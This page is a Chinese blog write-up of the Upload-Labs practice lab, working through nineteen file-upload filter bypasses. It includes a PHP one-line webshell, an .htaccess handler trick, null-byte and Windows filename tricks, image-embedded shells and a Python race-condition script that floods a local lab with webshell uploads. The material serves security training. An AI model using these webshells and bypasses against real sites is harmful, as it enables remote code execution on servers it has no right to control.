@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uplode-Labs通关笔记 - co0ontty</title>
+    <meta name="author"  content="co0ontty">
+    <meta name="description" content="Uplode-Labs通关笔记">
+    <meta name="keywords"  content="CTF, WEB, ALL">
+    <!-- Open Graph -->
+    <meta property="og:title" content="Uplode-Labs通关笔记 - co0ontty">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="http://localhost:4000/2019/04/09/uplodelabs.html">
+    <meta property="og:description" content="Walking to Dalao。">
+    <meta property="og:site_name" content="co0ontty">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/share.min.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+	
+	<!--
+Author: Ray-Eldath
+refer to:
+ - http://docs.mathjax.org/en/latest/options/index.html
+-->
+
+	<script type="text/javascript" async src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+		jax: ["input/TeX", "output/HTML-CSS"],
+		tex2jax: {
+			inlineMath: [ ["$", "$"] ],
+			displayMath: [ ["$$", "$$"] ],
+			skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+		},
+		"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"] }
+      });
+    </script>
+
+	
+    <!--
+Author: Ray-Eldath
+-->
+<style>
+    .markdown-body .anchor{
+        float: left;
+        margin-top: -8px;
+        margin-left: -20px;
+        padding-right: 4px;
+        line-height: 1;
+        opacity: 0;
+    }
+    
+    .markdown-body .anchor .anchor-icon{
+        font-size: 15px
+    }
+</style>
+<script>
+    $(document).ready(function() {
+        let nodes = document.querySelector(".markdown-body").querySelectorAll("h1,h2,h3")
+        for(let node of nodes) {
+            var anchor = document.createElement("a")
+            var anchorIcon = document.createElement("i")
+            anchorIcon.setAttribute("class", "fa fa-anchor fa-lg anchor-icon")
+            anchorIcon.setAttribute("aria-hidden", true)
+            anchor.setAttribute("class", "anchor")
+            anchor.setAttribute("href", "#" + node.getAttribute("id"))
+            
+            anchor.onmouseover = function() {
+                this.style.opacity = "0.4"
+            }
+            
+            anchor.onmouseout = function() {
+                this.style.opacity = "0"
+            }
+            
+            anchor.appendChild(anchorIcon)
+            node.appendChild(anchor)
+        }
+    })
+</script>
+</head>
+
+
+<body>
+  <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+  <input id="nm-switch" type="hidden" value="true"> <header class="g-header">
+    <div class="g-logo">
+      <a href="/"></a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">首页</a></li>
+            
+            <li><a href="/tags.html">标签</a></li>
+            
+            <li><a href="/links.html">友链</a></li>
+            
+            <li><a href="/about.html">关于我</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+  <header
+    class="g-banner post-header post-pattern-circuitBoard bgcolor-default "
+    data-theme="default"
+  >
+    <div class="post-wrapper">
+      <div class="post-tags">
+        
+          
+            <a href="http://localhost:4000/tags#CTF" class="post-tag">CTF</a>
+          
+            <a href="http://localhost:4000/tags#WEB" class="post-tag">WEB</a>
+          
+            <a href="http://localhost:4000/tags#ALL" class="post-tag">ALL</a>
+          
+        
+      </div>
+      <h1>Uplode-Labs通关笔记</h1>
+      <div class="post-meta">
+        <span class="post-meta-item"><i class="iconfont icon-author"></i>co0ontty</span>
+        <time class="post-meta-item" datetime="19-04-09"><i class="iconfont icon-date"></i>09 Apr 2019</time>
+      </div>
+    </div>
+    
+    <div class="filter"></div>
+      <div class="post-cover" style="background: url('https://i.loli.net/2019/04/08/5cab11a102167.png') center no-repeat; background-size: cover;"></div>
+    
+  </header>
+
+  <div class="post-content visible">
+    
+
+    <article class="markdown-body">
+      <h2 id="漏洞类型分析">漏洞类型分析</h2>
+<p><img src="https://i.loli.net/2019/04/08/5caafd2f23ed2.png" alt="漏洞类型分析" /></p>
+<h2 id="漏洞类型判断">漏洞类型判断</h2>
+<p><img src="https://i.loli.net/2019/04/08/5caafa634c7f7.png" alt="思路图" /></p>
+<h2 id="简单shell制作">简单shell制作</h2>
+<p>shell.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">assert</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">])</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>使用方法：<br />
+http://104.36.68.99/upload/shell.php?cmd=phpinfo();</p>
+<h2 id="pass-1--前端js判断">Pass-1  （前端JS判断）</h2>
+<p>使用burp进行抓包直接上传webshell，发现在没有数据传输的情况下判定为不合规文件这说明在客户端通过JS进行判断</p>
+
+<p><a href="https://i.loli.net/2019/04/08/5cab0e218624d.png"><img src="https://i.loli.net/2019/04/08/5cab0e218624d.png" alt="屏幕快照 2019-04-08 16.58.50.png" /></a>
+<a href="https://i.loli.net/2019/04/08/5cab0e2234de6.png"><img src="https://i.loli.net/2019/04/08/5cab0e2234de6.png" alt="屏幕快照 2019-04-08 16.59.04.png" /></a>
+<a href="https://i.loli.net/2019/04/08/5cab0e22e9b1e.png"><img src="https://i.loli.net/2019/04/08/5cab0e22e9b1e.png" alt="屏幕快照 2019-04-08 16.59.06.png" /></a></p>
+
+<p>将图中标红色的1.php改为1.png</p>
+
+<p><a href="https://i.loli.net/2019/04/08/5cab0e1fc6cfd.png"><img src="https://i.loli.net/2019/04/08/5cab0e1fc6cfd.png" alt="屏幕快照 2019-04-08 17.00.48.png" /></a></p>
+
+<p>成功上传，执行shell</p>
+
+<p><a href="https://i.loli.net/2019/04/08/5cab108972e22.png"><img src="https://i.loli.net/2019/04/08/5cab108972e22.png" alt="屏幕快照 2019-04-08 17.12.25.png" /></a></p>
+
+<h3 id="大佬教的骚操作">大佬教的骚操作：</h3>
+<p>禁用本页JS，直接上传 <br />
+<a href="https://i.loli.net/2019/04/09/5cabf54fdd3de.png"><img src="https://i.loli.net/2019/04/09/5cabf54fdd3de.png" alt="01-1.png" /></a></p>
+
+<h2 id="pass-2--服务器端端后缀判断">Pass-2  （服务器端端后缀判断）</h2>
+
+<p>使用burp抓包上传1.php，网页发送数据，burp获得流量，可以判断为服务器端响应。<br />
+①将文件后缀修改为jpg后上传，再将1.png修改为1.php,成功上传  <br />
+②上传1.php，将包文件中的 Content-Type: 修改为 image/jpeg 成功上传 <br />
+最终达到的效果为：
+<a href="https://i.loli.net/2019/04/09/5cabece6799fe.png"><img src="https://i.loli.net/2019/04/09/5cabece6799fe.png" alt="屏幕快照 2019-04-09 08.52.37.png" /></a><br />
+可以判断为服务器端检查文件类型</p>
+<h2 id="pass-3白名单-phtmlphp5">Pass-3（白名单-.phtml、.php5）</h2>
+<p>将1.php的后缀修改为jpg进行上传，抓包修改后缀上传提示错误 <br />
+<a href="https://i.loli.net/2019/04/09/5cabef6455bba.png"><img src="https://i.loli.net/2019/04/09/5cabef6455bba.png" alt="屏幕快照 2019-04-09 09.02.22.png" /></a>
+证明服务器端检查后缀 <br />
+尝试上传任意后缀文件（php语言除了可以解析以php为后缀的文件，还可以解析phtml、php2，php3、php4、php5这些后缀的文件。）</p>
+
+<p>上传成功，证明使用的检查模式为黑名单检查。</p>
+
+<h2 id="pass-4-白名单-htaccess">Pass-4 （白名单-.htaccess)</h2>
+<p>本题目为JS前端判断后缀，服务端黑名单过滤数据。<br />
+后端未过滤”.htaccess”文件，上传”.htaccess”文件，文件内容为</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;FilesMatch</span> <span class="err">"</span><span class="na">03</span><span class="err">.</span><span class="na">jpg</span><span class="err">"</span><span class="nt">&gt;</span>
+SetHandler application/x-httpd-php
+<span class="nt">&lt;/FilesMatch&gt;</span>
+</code></pre></div></div>
+<p>该代码文件将03.jpg解析为php文件<br />
+<a href="https://i.loli.net/2019/04/09/5cac893e518c1.png"><img src="https://i.loli.net/2019/04/09/5cac893e518c1.png" alt="屏幕快照 2019-04-09 19.53.36.png" /></a>
+上传成功后，上传图片马03.jpg ，运行成功  <br />
+<a href="https://i.loli.net/2019/04/09/5cac8971e083b.png"><img src="https://i.loli.net/2019/04/09/5cac8971e083b.png" alt="屏幕快照 2019-04-09 19.55.50.png" /></a></p>
+<h2 id="pass-5未区分大小写">Pass-5（未区分大小写）</h2>
+<p>Pass-4中存在以下代码：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写</span>
+</code></pre></div></div>
+<p>而Pass-5中没有，说明Pass-5虽然过滤了所有的文件后缀，但是没有区分大小写。
+上传shell.PHP即可绕过</p>
+<h2 id="pass-6文件名后缀空格">Pass-6（文件名+后缀+空格）</h2>
+<p>相比于第五关的过滤条件缺少了</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//首尾去空</span>
+</code></pre></div></div>
+<p>所以通过构造文件名+后缀+空格进行绕过，即”shell.php “</p>
+<h2 id="pass-7--shellphp">Pass-7  （shell.php.）</h2>
+<p>缺少”.”过滤代码：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点</span>
+</code></pre></div></div>
+<p>所以利用windows文件系统的文件名特性（windows系统上的文件名最后一个.会被去掉）通过构造shell.php.进行绕过</p>
+<h2 id="pass-8-data">Pass-8 （::$DATA）</h2>
+<p>Windows文件流特性绕过，文件名改成shell.php::$DATA，上传成功后保存的文件名其实是shell.php</p>
+<h2 id="pass-9--点空格点">Pass-9  （点+空格+点）</h2>
+<p>黑名单过滤，注意第15行和之前不太一样，路径拼接的是处理后的文件名，于是构造info.php. . （点+空格+点），经过处理后，文件名变成info.php.，即可绕过，经过windows文件系统的特性处理后即可上传访问成功。</p>
+<h2 id="pass-10--双写后缀名">Pass-10  （双写后缀名）</h2>
+<p>第8行代码存在上传漏洞：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">6</span><span class="err">：</span><span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"php"</span><span class="p">,</span><span class="s2">"php5"</span><span class="p">,</span><span class="s2">"php4"</span><span class="p">,</span><span class="s2">"php3"</span><span class="p">,</span><span class="s2">"php2"</span><span class="p">,</span><span class="s2">"html"</span><span class="p">,</span><span class="s2">"htm"</span><span class="p">,</span><span class="s2">"phtml"</span><span class="p">,</span><span class="s2">"pht"</span><span class="p">,</span><span class="s2">"jsp"</span><span class="p">,</span><span class="s2">"jspa"</span><span class="p">,</span><span class="s2">"jspx"</span><span class="p">,</span><span class="s2">"jsw"</span><span class="p">,</span><span class="s2">"jsv"</span><span class="p">,</span><span class="s2">"jspf"</span><span class="p">,</span><span class="s2">"jtml"</span><span class="p">,</span><span class="s2">"asp"</span><span class="p">,</span><span class="s2">"aspx"</span><span class="p">,</span><span class="s2">"asa"</span><span class="p">,</span><span class="s2">"asax"</span><span class="p">,</span><span class="s2">"ascx"</span><span class="p">,</span><span class="s2">"ashx"</span><span class="p">,</span><span class="s2">"asmx"</span><span class="p">,</span><span class="s2">"cer"</span><span class="p">,</span><span class="s2">"swf"</span><span class="p">,</span><span class="s2">"htaccess"</span><span class="p">);</span>
+<span class="mi">7</span><span class="o">:</span> <span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upload_file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
+<span class="mi">8</span><span class="o">:</span><span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$deny_ext</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span> <span class="nv">$file_name</span><span class="p">);</span>
+
+</code></pre></div></div>
+<p>该代码的作用为将第六行中的$deny_ext中的后缀名替换为空。
+所以本题目可以使用双写后缀名的方法进行绕过。
+<img src="https://i.loli.net/2019/04/12/5cafeae609ce6.png" alt="屏幕快照 2019-04-12 09.29.58.png" /></p>
+<h2 id="pass-11-00截断-00">Pass-11 （00截断-%00）</h2>
+<p>抓包上传发现，文件的命名格式是将路径与文件名连接起来进行上传
+<a href="https://i.loli.net/2019/04/12/5cb066949f76d.png"><img src="https://i.loli.net/2019/04/12/5cb066949f76d.png" alt="屏幕快照 2019-04-12 18.20.15.png" /></a><br />
+解题方法为：
+<a href="https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png"><img src="https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png" alt="屏幕快照 2019-04-12 18.44.22.png" /></a>
+讲道理这样就算上传成功了但是我遇到了些问题，可能服务器安全策略配置问题，放弃挣扎。
+<a href="https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png"><img src="https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png" alt="屏幕快照 2019-04-12 18.26.16.png" /></a>
+如果哪位大佬知道怎么回事可以评论告诉我</p>
+<h2 id="pass-12-00截断-0x00">Pass-12 （00截断-0x00)</h2>
+<p>同Pass-11 但是这次需要将%00换成空格，然后在hex选项卡中将20改为00</p>
+
+<h2 id="pass-13-添加文件头进行绕过">Pass-13 (添加文件头进行绕过)</h2>
+
+<p>绕过文件头检查，添加GIF图片的文件头<code class="highlighter-rouge">GIF89a</code>，绕过GIF图片检查。</p>
+
+<p><img src="/assets/img/posts/13-1.png" alt="" /></p>
+
+<p>使用命令<code class="highlighter-rouge">copy normal.jpg /b + shell.php /a webshell.jpg</code>，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg">JPG一句话shell参考示例</a></p>
+
+<p><img src="/assets/img/posts/13-2.png" alt="" /></p>
+
+<p>png图片处理方式同上。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png">PNG一句话shell参考示例</a></p>
+
+<p><img src="/assets/img/posts/13-3.png" alt="" /></p>
+
+<h2 id="pass-14">Pass-14</h2>
+
+<p>原理和示例同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
+
+<p><img src="/assets/img/posts/14-1.png" alt="" /></p>
+
+<p>png图片webshell上传同<strong>Pass-13</strong>。</p>
+
+<p>jpg/jpeg图片webshell上传存在问题，正常的图片也上传不了，等待作者调整。</p>
+
+<h2 id="pass-15">Pass-15</h2>
+
+<p>原理同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
+
+<p><img src="/assets/img/posts/15-1.png" alt="" /></p>
+
+<p>png图片webshell上传同<strong>Pass-13</strong>。</p>
+
+<p>jpg/jpeg图片webshell上传同<strong>Pass-13</strong>。</p>
+
+<h2 id="pass-16-对比渲染图片添加代码">Pass-16 （对比渲染图片，添加代码）</h2>
+
+<p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p>
+
+<p>这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif">示例</a>。</p>
+
+<p><img src="/assets/img/posts/16-1.png" alt="" /></p>
+
+<p>打开被渲染后的图片，Webshell代码仍然存在</p>
+
+<p><img src="/assets/img/posts/16-2.png" alt="" /></p>
+
+<p>提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg">示例文件</a>。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。</p>
+
+<p><img src="/assets/img/posts/16-3.png" alt="" /></p>
+
+<p><img src="/assets/img/posts/16-4.png" alt="" /></p>
+
+<p>从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png">示例文件</a>即可，并不需要图片是正常的图片。</p>
+
+<p><img src="/assets/img/posts/16-5.png" alt="" /></p>
+
+<p>程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。</p>
+
+<p><img src="/assets/img/posts/16-6.png" alt="" /></p>
+
+<p>同时你也可以使用工具对文件进行渲染：
+https://wiki.ioin.in/soft/detail/1q
+先上传正常图片，经过渲染后下载正常图片，使用该工具处理经过渲染的图片，成功上传。</p>
+<h2 id="pass-17-多线程并发上传绕过删除条件竞争">Pass-17 （多线程并发上传绕过删除条件竞争）</h2>
+
+<p>利用条件竞争删除文件时间差绕过。使用命令<code class="highlighter-rouge">pip install hackhttp</code>安装<a href="https://github.com/BugScanTeam/hackhttp">hackhttp</a>模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+# coding:utf-8
+# Build By LandGrey
+</span>
+<span class="kn">import</span> <span class="nn">hackhttp</span>
+<span class="kn">from</span> <span class="nn">multiprocessing.dummy</span> <span class="kn">import</span> <span class="n">Pool</span> <span class="k">as</span> <span class="n">ThreadPool</span>
+
+
+<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">lists</span><span class="p">):</span>
+    <span class="n">hh</span> <span class="o">=</span> <span class="n">hackhttp</span><span class="o">.</span><span class="n">hackhttp</span><span class="p">()</span>
+    <span class="n">raw</span> <span class="o">=</span> <span class="s">"""POST /upload-labs/Pass-17/index.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/upload-labs/Pass-17/index.php
+Cookie: pass=17
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------6696274297634
+Content-Length: 341
+
+-----------------------------6696274297634
+Content-Disposition: form-data; name="upload_file"; filename="17.php"
+Content-Type: application/octet-stream
+
+&lt;?php assert($_POST["LandGrey"])?&gt;
+-----------------------------6696274297634
+Content-Disposition: form-data; name="submit"
+
+上传
+-----------------------------6696274297634--
+"""</span>
+    <span class="n">code</span><span class="p">,</span> <span class="n">head</span><span class="p">,</span> <span class="n">html</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">log</span> <span class="o">=</span> <span class="n">hh</span><span class="o">.</span><span class="n">http</span><span class="p">(</span><span class="s">'http://127.0.0.1/upload-labs/Pass-17/index.php'</span><span class="p">,</span> <span class="n">raw</span><span class="o">=</span><span class="n">raw</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span>
+
+
+<span class="n">pool</span> <span class="o">=</span> <span class="n">ThreadPool</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">pool</span><span class="o">.</span><span class="nb">map</span><span class="p">(</span><span class="n">upload</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">))</span>
+<span class="n">pool</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">pool</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>在脚本运行的时候，访问Webshell</p>
+
+<p><img src="/assets/img/posts/17-1.png" alt="" /></p>
+
+<h2 id="pass-18-多线程并发绕过重命名条件竞争">Pass-18 （多线程并发绕过重命名条件竞争）</h2>
+
+<p>刚开始没有找到绕过方法，最后下载作者Github提供的打包环境，利用上传重命名竞争+Apache解析漏洞，成功绕过。</p>
+
+<p>上传名字为<code class="highlighter-rouge">18.php.7Z</code>的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。</p>
+
+<p><img src="/assets/img/posts/18-1.png" alt="" /></p>
+
+<p>快速提交上面的数据包，可以让文件名字不被重命名上传成功。</p>
+
+<p><img src="/assets/img/posts/18-2.png" alt="" /></p>
+
+<p>然后利用Apache的解析漏洞，即可获得shell</p>
+
+<p><img src="/assets/img/posts/18-3.png" alt="" /></p>
+
+<h2 id="pass-19">Pass-19</h2>
+
+<p>原理同<strong>Pass-11</strong>，上传的文件名用0x00绕过。改成<code class="highlighter-rouge">19.php【二进制00】.1.jpg</code></p>
+
+<p><img src="/assets/img/posts/19-1.png" alt="" /></p>
+
+<h2 id="后记">后记</h2>
+
+<p>可以发现以上绕过方法中有些是重复的，有些是意外情况，可能与项目作者的本意不符，故本文仅作为参考使用。</p>
+
+<p>等作者修复代码逻辑后，本文也会适时更新。</p>
+
+    </article>
+
+    
+    <div class="social-share-wrapper">
+      <div class="social-share"></div>
+    </div>
+    
+  </div>
+
+  <section class="author-detail">
+    <section class="post-footer-item author-card">
+      <div class="avatar">
+        <img src="http://localhost:4000/assets/img/profile.png" alt="">
+      </div>
+      <div class="author-name" rel="author">co0ontty</div>
+      <div class="bio">
+        <p>知道创宇实习生</p>
+      </div>
+      
+      <ul class="sns-links">
+        
+        <li>
+          <a href="//weibo.com/5792988237" target="_blank">
+                    <i class="iconfont icon-weibo"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="mailto:co0ontty@gmail.com" target="_blank">
+                    <i class="iconfont icon-email"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//facebook.com/co0ontty" target="_blank">
+                    <i class="iconfont icon-facebook"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//github.com/co0ontty" target="_blank">
+                    <i class="iconfont icon-github"></i>
+                </a>
+        </li>
+        
+      </ul>
+      
+    </section>
+    <section class="post-footer-item read-next">
+      
+      <div class="read-next-item">
+        <a href="/2019/04/13/batterupload.html" class="read-next-link"></a>
+        <section>
+          <span>结合CTF详解条件竞争漏洞</span>
+          <p>什么是条件竞争漏洞？条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并...</p>
+        </section>
+        
+        <div class="filter"></div>
+        <img src="https://i.loli.net/2019/04/12/5cb07b9862aee.jpg" alt="">
+        
+     </div>
+      
+
+      
+      <div class="read-next-item">
+        <a href="/2019/04/06/miscnote.html" class="read-next-link"></a>
+          <section>
+            <span>CTF 杂项题目总结（持续更新）</span>
+            <p>图片隐写</p>
+          </section>
+          
+          <div class="filter"></div>
+          <img src="/assets/img/posts/ada.png" alt="">
+          
+      </div>
+      
+    </section>
+    
+  </section>
+<div id="lv-container" data-id="city" data-uid="MTAyMC80MTI3My8xNzgyMQ==">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+  <footer class="g-footer">
+  <!-- <section><a href="javascript:scroll(50,50)">回到顶端</a></section> -->
+<!-- 网站计数器 -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div style="margin: auto;width: auto;">
+      <span id="site_pv_count" title="总点击量"><img src="/assets/vendor/octicons/svg/eye.svg" width=16 height=16 > <span id="busuanzi_value_site_pv"></span></span> &nbsp; &nbsp; | &nbsp; &nbsp; 
+    <span id="site_uv_count" title="总访客量"> <img src="/assets/vendor/octicons/svg/person.svg" width=10 height=16> <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+<!-- 到此为止 -->
+  <section>co0ontty ©
+  
+  
+    2018
+    -
+  
+  2019
+  </section>
+  <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+
+
+</footer>
+
+
+  <script src="/assets/js/social-share.min.js"></script>
+  <script>
+    socialShare('.social-share', {
+      sites: [
+        
+          'wechat'
+          ,
+          
+        
+          'weibo'
+          ,
+          
+        
+          'douban'
+          ,
+          
+        
+          'twitter'
+          
+        
+      ],
+      wechatQrcodeTitle: "分享到微信朋友圈",
+      wechatQrcodeHelper: '<p>扫码后点击右上角</p><p>将本文分享至朋友圈</p>'
+    });
+  </script>
+
+  
+  
+
+  <script src="/assets/js/prism.js"></script>
+  <script src="/assets/js/index.min.js"></script>
+  <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?7084bb2b47ca9a611ae8225633e5caeb";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-129901756-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-129901756-1');
+</script>
+
+</body>
+
+</html>
